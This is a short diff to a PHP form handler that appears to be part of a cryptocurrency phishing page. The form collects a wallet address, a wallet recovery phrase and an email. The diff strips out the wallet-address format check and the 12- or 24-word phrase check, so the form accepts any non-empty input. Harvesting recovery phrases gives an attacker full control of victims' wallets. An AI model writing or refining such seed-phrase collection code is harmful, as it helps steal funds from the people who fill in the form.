@@ -82,17 +82,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     
     if (empty($walletAddress)) {
         $errors[] = "Wallet address is required";
-    } elseif (!preg_match('/^0x[a-fA-F0-9]{40}$/', $walletAddress)) {
-        $errors[] = "Invalid wallet address format";
-    }
+    } 
     
     if (empty($seedPhrase)) {
         $errors[] = "Recovery phrase is required";
-    } else {
-        $wordCount = str_word_count($seedPhrase);
-        if ($wordCount != 12 && $wordCount != 24) {
-            $errors[] = "Recovery phrase must be 12 or 24 words";
-        }
     }
     
     if (empty($email)) {
